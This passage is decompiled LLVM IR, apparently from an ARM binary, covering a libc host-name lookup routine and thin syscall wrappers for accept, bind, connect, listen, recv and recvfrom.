  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12c04 = load i32, i32* @r4, align 4
  %v6_12c04 = load i32, i32* @r5, align 4
  %v9_12c04 = load i32, i32* @r6, align 4
  %v12_12c04 = load i32, i32* @r7, align 4
  %v15_12c04 = load i32, i32* @r8, align 4
  %v18_12c04 = load i32, i32* @sb, align 4
  %v21_12c04 = load i32, i32* @sl, align 4
  %v24_12c04 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_12c14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c14, i32* @fp, align 4
  %v2_12c14 = icmp eq i32 %v0_12c14, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_12c24 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_12c24, align 4
  br i1 %v2_12c14, label %bb, label %dec_label_pc_12c30

bb:                                               ; preds = %entry
  %v1_12c28 = load i32, i32* %r0.global-to-local, align 4
  %v2_12c28 = add i32 %v1_12c28, 22
  store i32 %v2_12c28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12c30:                               ; preds = %entry
  %v0_12c30 = call i32 @__errno_location()
  store i32 %v0_12c30, i32* %r0.global-to-local, align 4
  %v3_12c34 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12c34, i32* %ip.global-to-local, align 4
  %v1_12c38 = inttoptr i32 %v0_12c30 to i32*
  %v2_12c38 = load i32, i32* %v1_12c38, align 4
  store i32 %v2_12c38, i32* @r8, align 4
  %v0_12c3c = load i32, i32* @r6, align 4
  store i32 %v0_12c3c, i32* %v1_12c38, align 4
  %v0_12c40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_12c30, i32* @r5, align 4
  %v0_12c50 = load i32, i32* @fp, align 4
  store i32 %v0_12c50, i32* %r0.global-to-local, align 4
  %v0_12c54 = load i32, i32* @sl, align 4
  store i32 %v0_12c54, i32* %r2.global-to-local, align 4
  %v0_12c58 = load i32, i32* @r7, align 4
  store i32 %v0_12c58, i32* %r3.global-to-local, align 4
  %v0_12c5c = load i32, i32* @r4, align 4
  %v7_12c64 = call i32 @__get_hosts_byname_r(i32 %v0_12c50, i32 2, i32 %v0_12c54, i32 %v0_12c58, i32 %v0_12c5c, i32 %v0_12c40, i32 %arg6)
  store i32 %v7_12c64, i32* %r0.global-to-local, align 4
  %v2_12c68 = icmp eq i32 %v7_12c64, 0
  br i1 %v2_12c68, label %dec_label_pc_12f54, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c30
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_12c74 = inttoptr i32 %arg6 to i32*
  %v2_12c74 = load i32, i32* %v1_12c74, align 4
  store i32 %v2_12c74, i32* %r3.global-to-local, align 4
  %v7_12c78 = icmp eq i32 %v2_12c74, 1
  br i1 %v7_12c78, label %dec_label_pc_12c9c, label %dec_label_pc_12c80

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c70
  %v7_12c80 = icmp eq i32 %v2_12c74, 4
  br i1 %v7_12c80, label %dec_label_pc_12c9c, label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c80
  %v3_12c88 = icmp eq i32 %v2_12c74, -1
  br i1 %v3_12c88, label %dec_label_pc_12c90, label %dec_label_pc_12f54

dec_label_pc_12c90:                               ; preds = %dec_label_pc_12c88
  %v0_12c90 = load i32, i32* @r5, align 4
  %v1_12c90 = inttoptr i32 %v0_12c90 to i32*
  %v2_12c90 = load i32, i32* %v1_12c90, align 4
  store i32 %v2_12c90, i32* %r3.global-to-local, align 4
  %v7_12c94 = icmp eq i32 %v2_12c90, 2
  br i1 %v7_12c94, label %dec_label_pc_12c9c, label %dec_label_pc_12f54

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c90, %dec_label_pc_12c80, %dec_label_pc_12c70
  %v0_12c9c = load i32, i32* @r7, align 4
  %v1_12c9c = sub i32 0, %v0_12c9c
  %v1_12ca0 = urem i32 %v1_12c9c, 4
  store i32 %v1_12ca0, i32* %r3.global-to-local, align 4
  %v2_12ca0 = icmp eq i32 %v1_12ca0, 0
  %v0_12ca4 = load i32, i32* @r8, align 4
  %v1_12ca4 = load i32, i32* @r5, align 4
  %v2_12ca4 = inttoptr i32 %v1_12ca4 to i32*
  store i32 %v0_12ca4, i32* %v2_12ca4, align 4
  %v0_12cc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_12ca0, label %dec_label_pc_12cbc, label %dec_label_pc_12cac

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c9c
  %v1_12cac = load i32, i32* %r3.global-to-local, align 4
  %v2_12cac = sub i32 %v0_12cc4.pre, %v1_12cac
  %v3_12cac = icmp ult i32 %v0_12cc4.pre, %v1_12cac
  br i1 %v3_12cac, label %dec_label_pc_12f50, label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12cac
  store i32 %v2_12cac, i32* @r4, align 4
  %v0_12cb8 = load i32, i32* @r7, align 4
  %v2_12cb8 = add i32 %v0_12cb8, %v1_12cac
  store i32 %v2_12cb8, i32* @r7, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c9c, %dec_label_pc_12cb4
  %v0_12cc4 = phi i32 [ %v2_12cac, %dec_label_pc_12cb4 ], [ %v0_12cc4.pre, %dec_label_pc_12c9c ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_12c74, align 4
  %tmp31 = icmp ult i32 %v0_12cc4, 4
  br i1 %tmp31, label %dec_label_pc_12f50, label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12cbc
  %v0_12cd0 = load i32, i32* @r4, align 4
  %v1_12cd0 = add i32 %v0_12cd0, -4
  store i32 %v1_12cd0, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_12cd0, 8
  br i1 %tmp32, label %dec_label_pc_12f50, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cd0
  %v1_12cdc = add i32 %v0_12cd0, -12
  store i32 %v1_12cdc, i32* %r3.global-to-local, align 4
  %v0_12ce0 = load i32, i32* @r7, align 4
  %v1_12ce0 = add i32 %v0_12ce0, 4
  store i32 %v1_12ce0, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_12cec = inttoptr i32 %v1_12ce0 to i32*
  store i32 %v0_12ce0, i32* %v3_12cec, align 4
  %v0_12cf0 = load i32, i32* @r5, align 4
  %v1_12cf0 = load i32, i32* @sb, align 4
  %v2_12cf0 = add i32 %v1_12cf0, 4
  %v3_12cf0 = inttoptr i32 %v2_12cf0 to i32*
  store i32 %v0_12cf0, i32* %v3_12cf0, align 4
  %tmp33 = icmp ult i32 %v1_12cdc, 32
  br i1 %tmp33, label %dec_label_pc_12f50, label %dec_label_pc_12cf8

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cdc
  %v0_12cf8 = load i32, i32* @r4, align 4
  %v1_12cf8 = add i32 %v0_12cf8, -44
  store i32 %v1_12cf8, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_12cf8, 256
  br i1 %tmp34, label %dec_label_pc_12f50, label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cf8
  %v0_12d04 = load i32, i32* @r7, align 4
  %v1_12d04 = add i32 %v0_12d04, 44
  store i32 %v1_12d04, i32* @r6, align 4
  %v1_12d08 = add i32 %v0_12d04, 12
  store i32 %v1_12d08, i32* %r3.global-to-local, align 4
  %v0_12d0c = load i32, i32* @fp, align 4
  store i32 %v0_12d0c, i32* @r1, align 4
  store i32 %v1_12cf8, i32* %r2.global-to-local, align 4
  store i32 %v1_12d04, i32* %r0.global-to-local, align 4
  %v3_12d1c = call i32 @strncpy(i32 %v1_12d04, i32 %v0_12d0c, i32 %v1_12cf8)
  store i32 %v1_12d08, i32* %ip.global-to-local, align 4
  %v0_12d24 = load i32, i32* @r6, align 4
  %v1_12d24 = load i32, i32* @r7, align 4
  %v2_12d24 = add i32 %v1_12d24, 12
  %v3_12d24 = inttoptr i32 %v2_12d24 to i32*
  store i32 %v0_12d24, i32* %v3_12d24, align 4
  %v0_12d28 = load i32, i32* @fp, align 4
  store i32 %v0_12d28, i32* %r0.global-to-local, align 4
  %v0_12d2c = load i32, i32* @r5, align 4
  %v1_12d2c = load i32, i32* %ip.global-to-local, align 4
  %v2_12d2c = add i32 %v1_12d2c, 4
  %v3_12d2c = inttoptr i32 %v2_12d2c to i32*
  store i32 %v0_12d2c, i32* %v3_12d2c, align 4
  %v0_12d30 = load i32, i32* @r7, align 4
  %v2_12d34 = inttoptr i32 %v0_12d28 to i8*
  %v3_12d34 = call i32 @inet_aton(i8* %v2_12d34, i32 %v0_12d30)
  store i32 %v3_12d34, i32* %r0.global-to-local, align 4
  %v2_12d38 = icmp eq i32 %v3_12d34, 0
  br i1 %v2_12d38, label %dec_label_pc_12d7c, label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d04
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_12d48 = load i32, i32* @sl, align 4
  %v2_12d48 = add i32 %v1_12d48, 8
  %v3_12d48 = inttoptr i32 %v2_12d48 to i32*
  store i32 2, i32* %v3_12d48, align 4
  %v0_12d4c = load i32, i32* %r3.global-to-local, align 4
  %v2_12d4c = mul i32 %v0_12d4c, 2
  %v1_12d50 = load i32, i32* @sl, align 4
  %v2_12d50 = add i32 %v1_12d50, 12
  %v3_12d50 = inttoptr i32 %v2_12d50 to i32*
  store i32 %v2_12d4c, i32* %v3_12d50, align 4
  %v3_12d54 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12d54, i32* %r2.global-to-local, align 4
  store i32 %v1_12d08, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_12d60 = load i32, i32* @r5, align 4
  store i32 %v0_12d60, i32* %r0.global-to-local, align 4
  %v0_12d64 = load i32, i32* @sl, align 4
  %v2_12d64 = inttoptr i32 %v3_12d54 to i32*
  store i32 %v0_12d64, i32* %v2_12d64, align 4
  %v0_12d68 = load i32, i32* @r6, align 4
  %v1_12d68 = load i32, i32* @sl, align 4
  %v2_12d68 = inttoptr i32 %v1_12d68 to i32*
  store i32 %v0_12d68, i32* %v2_12d68, align 4
  %v0_12d6c = load i32, i32* @sb, align 4
  %v1_12d6c = load i32, i32* @sl, align 4
  %v2_12d6c = add i32 %v1_12d6c, 16
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %v0_12d6c, i32* %v3_12d6c, align 4
  %v0_12d70 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d70 = load i32, i32* @sl, align 4
  %v2_12d70 = add i32 %v1_12d70, 4
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  %v0_12d74 = load i32, i32* @r5, align 4
  %v1_12d74 = load i32, i32* %ip.global-to-local, align 4
  %v2_12d74 = inttoptr i32 %v1_12d74 to i32*
  store i32 %v0_12d74, i32* %v2_12d74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d04
  %v2_12d7c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12d7c, i32* @r5, align 4
  %v1_12d80 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_12d7c, i32* @r0, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  %v1_12d98 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* %r0.global-to-local, align 4
  %v2_12da8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2abe0.674 to i32))
  store i32 %v2_12d7c, i32* @r0, align 4
  %v2_12db4 = load i32, i32* @global_var_2f650.679, align 4
  store i32 %v2_12db4, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  store i32 77256, i32* @lr, align 4
  %v1_12dc4 = call i32 @__pthread_cleanup_pop_restore()
  %v2_12dd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2f644.682 to i32), i32* %r3.global-to-local, align 4
  %v0_12ddc = load i32, i32* @fp, align 4
  store i32 %v0_12ddc, i32* %r0.global-to-local, align 4
  %v2_12de0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_12de0, i32* %ip.global-to-local, align 4
  %v0_12de4 = load i32, i32* @r4, align 4
  store i32 %v0_12de4, i32* %r2.global-to-local, align 4
  %v6_12df8 = inttoptr i32 %v0_12ddc to i8*
  %v7_12df8 = call i32 @__dns_lookup(i8* %v6_12df8, i32 1, i32 %v0_12de4, i32 ptrtoint (i32* @global_var_2f644.682 to i32), i32 %v2_12dd0, i32 %v2_12de0)
  store i32 %v7_12df8, i32* %r0.global-to-local, align 4
  %v1_12dfc = icmp slt i32 %v7_12df8, 0
  br i1 %v1_12dfc, label %.dec_label_pc_12f28_crit_edge, label %dec_label_pc_12e0c

.dec_label_pc_12f28_crit_edge:                    ; preds = %dec_label_pc_12d7c
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12f28

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12d7c
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_12e20 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_12e20, 255
  br i1 %tmp35, label %dec_label_pc_12ebc, label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %dec_label_pc_12e0c
  %v3_12e28 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12e28, i32* @r0, align 4
  %v0_12e2c = call i32 @free()
  %v3_12e30 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12e30, i32* @r0, align 4
  %v0_12e34 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_12c74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12e0c
  %v3_12ec0.pre = load i32, i32* %stack_var_-96, align 4
  %v0_12ec4.pre = load i32, i32* @r6, align 4
  store i32 %v1_12e20, i32* %r2.global-to-local, align 4
  store i32 %v3_12ec0.pre, i32* @r1, align 4
  store i32 %v0_12ec4.pre, i32* %r0.global-to-local, align 4
  %v3_12ec8 = call i32 @strncpy(i32 %v0_12ec4.pre, i32 %v3_12ec0.pre, i32 %v1_12e20)
  %v3_12ecc = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12ecc, i32* @r0, align 4
  %v0_12ed0 = call i32 @free()
  store i32 %v0_12ed0, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_12ed8 = icmp eq i32 %tmp7, 1
  br i1 %v7_12ed8, label %dec_label_pc_12ee0, label %dec_label_pc_12f34

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ebc
  store i32 4, i32* @r2, align 4
  %v0_12ee8 = load i32, i32* @r7, align 4
  store i32 %v0_12ee8, i32* @r0, align 4
  %v0_12eec = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_12d08, i32* %r2.global-to-local, align 4
  %v1_12ef8 = load i32, i32* @sl, align 4
  %v2_12ef8 = add i32 %v1_12ef8, 8
  %v3_12ef8 = inttoptr i32 %v2_12ef8 to i32*
  store i32 2, i32* %v3_12ef8, align 4
  %v0_12efc = load i32, i32* %r3.global-to-local, align 4
  %v2_12efc = mul i32 %v0_12efc, 2
  store i32 %v2_12efc, i32* %r3.global-to-local, align 4
  %v1_12f00 = load i32, i32* @sl, align 4
  %v2_12f00 = add i32 %v1_12f00, 12
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  store i32 %v2_12efc, i32* %v3_12f00, align 4
  %v3_12f04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12f04, i32* @r0, align 4
  %v0_12f08 = load i32, i32* @r6, align 4
  %v1_12f08 = load i32, i32* @sl, align 4
  %v2_12f08 = inttoptr i32 %v1_12f08 to i32*
  store i32 %v0_12f08, i32* %v2_12f08, align 4
  %v0_12f0c = load i32, i32* @sb, align 4
  %v1_12f0c = load i32, i32* @sl, align 4
  %v2_12f0c = add i32 %v1_12f0c, 16
  %v3_12f0c = inttoptr i32 %v2_12f0c to i32*
  store i32 %v0_12f0c, i32* %v3_12f0c, align 4
  %v0_12f10 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f10 = load i32, i32* @sl, align 4
  %v2_12f10 = add i32 %v1_12f10, 4
  %v3_12f10 = inttoptr i32 %v2_12f10 to i32*
  store i32 %v0_12f10, i32* %v3_12f10, align 4
  %v0_12f14 = call i32 @free()
  %v3_12f18 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12f18, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12f20 = load i32, i32* @sl, align 4
  %v2_12f20 = inttoptr i32 %v3_12f18 to i32*
  store i32 %v0_12f20, i32* %v2_12f20, align 4
  %v0_12f24 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12f24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f28

dec_label_pc_12f28:                               ; preds = %.dec_label_pc_12f28_crit_edge, %dec_label_pc_12ee0
  %v0_12f2c = phi i32 [ 1, %.dec_label_pc_12f28_crit_edge ], [ %v0_12f24, %dec_label_pc_12ee0 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_12f2c, i32* %v1_12c74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12ebc
  %v3_12f34 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12f34, i32* @r0, align 4
  %v0_12f38 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_12c74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12cac, %dec_label_pc_12cf8, %dec_label_pc_12cdc, %dec_label_pc_12cd0, %dec_label_pc_12cbc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12f54:                               ; preds = %bb, %dec_label_pc_12c90, %dec_label_pc_12c88, %dec_label_pc_12c30, %dec_label_pc_12e28, %dec_label_pc_12d44, %dec_label_pc_12f34, %dec_label_pc_12f28, %dec_label_pc_12f50
  store i32 %v3_12c04, i32* @r4, align 4
  store i32 %v6_12c04, i32* @r5, align 4
  store i32 %v9_12c04, i32* @r6, align 4
  store i32 %v12_12c04, i32* @r7, align 4
  store i32 %v15_12c04, i32* @r8, align 4
  store i32 %v18_12c04, i32* @sb, align 4
  store i32 %v21_12c04, i32* @sl, align 4
  store i32 %v24_12c04, i32* @fp, align 4
  %v29_12f58 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_12f58

; uselistorder directives
  uselistorder i32 %v2_12efc, { 1, 0 }
  uselistorder i32 %v1_12e20, { 1, 2, 0 }
  uselistorder i32 %v1_12d08, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12d04, { 1, 0, 2 }
  uselistorder i32 %v1_12cf8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12cc4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_12ca0, { 1, 0 }
  uselistorder i32* %v1_12c74, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_12c14, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 21, 22, 23, 24, 25, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r2.global-to-local, { 7, 8, 9, 10, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 18, 16, 17, 19, 20, 21, 3, 4, 7, 5, 6, 8, 10, 9, 11, 13, 12, 15, 14, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12f54, { 8, 6, 7, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12f50, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12f28, { 1, 0 }
  uselistorder label %dec_label_pc_12cbc, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f78 = load i32, i32* @r4, align 4
  store i32 %v3_12f78, i32* %stack_var_-8, align 4
  %v0_12f7c = call i32 @accept()
  store i32 %v0_12f7c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f7c, -4095
  br i1 %tmp, label %dec_label_pc_12f9c, label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %entry
  %v0_12f8c = call i32 @__errno_location()
  %v0_12f90 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f90 = sub i32 0, %v0_12f90
  %v2_12f94 = inttoptr i32 %v0_12f8c to i32*
  store i32 %v1_12f90, i32* %v2_12f94, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %entry, %dec_label_pc_12f8c
  %v0_12f9c = phi i32 [ %v0_12f7c, %entry ], [ -1, %dec_label_pc_12f8c ]
  %v2_12fa0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12fa0, i32* %r4.global-to-local, align 4
  ret i32 %v0_12f9c

; uselistorder directives
  uselistorder i32 %v0_12f7c, { 1, 0, 2 }
  uselistorder i32 ()* @accept, { 1, 0 }
  uselistorder label %dec_label_pc_12f9c, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fa4 = load i32, i32* @r4, align 4
  store i32 %v3_12fa4, i32* %stack_var_-8, align 4
  %v0_12fa8 = call i32 @bind()
  store i32 %v0_12fa8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fa8, -4095
  br i1 %tmp, label %dec_label_pc_12fc8, label %dec_label_pc_12fb8

dec_label_pc_12fb8:                               ; preds = %entry
  %v0_12fb8 = call i32 @__errno_location()
  %v0_12fbc = load i32, i32* %r4.global-to-local, align 4
  %v1_12fbc = sub i32 0, %v0_12fbc
  %v2_12fc0 = inttoptr i32 %v0_12fb8 to i32*
  store i32 %v1_12fbc, i32* %v2_12fc0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %entry, %dec_label_pc_12fb8
  %v0_12fc8 = phi i32 [ %v0_12fa8, %entry ], [ -1, %dec_label_pc_12fb8 ]
  %v2_12fcc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12fcc, i32* @r4, align 4
  ret i32 %v0_12fc8

; uselistorder directives
  uselistorder i32 %v0_12fa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12fc8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fd0 = load i32, i32* @r4, align 4
  store i32 %v3_12fd0, i32* %stack_var_-8, align 4
  %v0_12fd4 = call i32 @connect()
  store i32 %v0_12fd4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fd4, -4095
  br i1 %tmp, label %dec_label_pc_12ff4, label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %entry
  %v0_12fe4 = call i32 @__errno_location()
  %v0_12fe8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12fe8 = sub i32 0, %v0_12fe8
  %v2_12fec = inttoptr i32 %v0_12fe4 to i32*
  store i32 %v1_12fe8, i32* %v2_12fec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %entry, %dec_label_pc_12fe4
  %v0_12ff4 = phi i32 [ %v0_12fd4, %entry ], [ -1, %dec_label_pc_12fe4 ]
  %v2_12ff8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12ff8, i32* @r4, align 4
  ret i32 %v0_12ff4

; uselistorder directives
  uselistorder i32 %v0_12fd4, { 1, 0, 2 }
  uselistorder i32 ()* @connect, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ff4, { 1, 0 }
}

define i32 @listen() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ffc = load i32, i32* @r4, align 4
  store i32 %v3_12ffc, i32* %stack_var_-8, align 4
  %v0_13000 = call i32 @listen()
  store i32 %v0_13000, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13000, -4095
  br i1 %tmp, label %dec_label_pc_13020, label %dec_label_pc_13010

dec_label_pc_13010:                               ; preds = %entry
  %v0_13010 = call i32 @__errno_location()
  %v0_13014 = load i32, i32* %r4.global-to-local, align 4
  %v1_13014 = sub i32 0, %v0_13014
  %v2_13018 = inttoptr i32 %v0_13010 to i32*
  store i32 %v1_13014, i32* %v2_13018, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %entry, %dec_label_pc_13010
  %v0_13020 = phi i32 [ %v0_13000, %entry ], [ -1, %dec_label_pc_13010 ]
  %v2_13024 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13024, i32* @r4, align 4
  ret i32 %v0_13020

; uselistorder directives
  uselistorder i32 %v0_13000, { 1, 0, 2 }
  uselistorder i32 ()* @listen, { 1, 0 }
  uselistorder label %dec_label_pc_13020, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13028 = load i32, i32* @r4, align 4
  store i32 %v3_13028, i32* %stack_var_-8, align 4
  %v0_1302c = call i32 @recv()
  store i32 %v0_1302c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1302c, -4095
  br i1 %tmp, label %dec_label_pc_1304c, label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %entry
  %v0_1303c = call i32 @__errno_location()
  %v0_13040 = load i32, i32* %r4.global-to-local, align 4
  %v1_13040 = sub i32 0, %v0_13040
  %v2_13044 = inttoptr i32 %v0_1303c to i32*
  store i32 %v1_13040, i32* %v2_13044, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %entry, %dec_label_pc_1303c
  %v0_1304c = phi i32 [ %v0_1302c, %entry ], [ -1, %dec_label_pc_1303c ]
  %v2_13050 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13050, i32* @r4, align 4
  ret i32 %v0_1304c

; uselistorder directives
  uselistorder i32 %v0_1302c, { 1, 0, 2 }
  uselistorder i32 ()* @recv, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1304c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13054 = load i32, i32* @r4, align 4
  store i32 %v3_13054, i32* %stack_var_-12, align 4
  %v6_13054 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_13060 = call i32 @recvfrom()
  store i32 %v0_13060, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13060, -4095
  br i1 %tmp, label %dec_label_pc_13080, label %dec_label_pc_13070

dec_label_pc_13070:                               ; preds = %entry
  %v0_13070 = call i32 @__errno_location()
  %v0_13074 = load i32, i32* %r4.global-to-local, align 4
  %v1_13074 = sub i32 0, %v0_13074
  %v2_13078 = inttoptr i32 %v0_13070 to i32*
  store i32 %v1_13074, i32* %v2_13078, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13080

